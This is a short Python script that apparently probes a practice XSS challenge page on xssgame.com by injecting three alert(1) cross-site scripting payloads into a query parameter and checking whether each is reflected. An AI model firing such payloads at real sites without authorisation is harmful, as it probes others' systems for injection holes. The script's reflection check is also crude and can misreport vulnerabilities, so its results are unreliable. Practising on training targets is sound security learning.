import requests

xss_payloads = ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '"><script>alert(1)</script>']

# Target URL
url = "http://www.xssgame.com/f/m4KKGHi2rVUN/?query="

for payload in xss_payloads:
    # Inject payload into URL
    target_url = url + payload
    # Send GET request with payload
    response = requests.get(target_url)
    # Check if payload was executed by looking for the payload's signature in the response content
    if payload in str(response.content):
        print(f'XSS vulnerability found in {target_url}')
    else:
        print(f'No XSS vulnerability found in {target_url}')
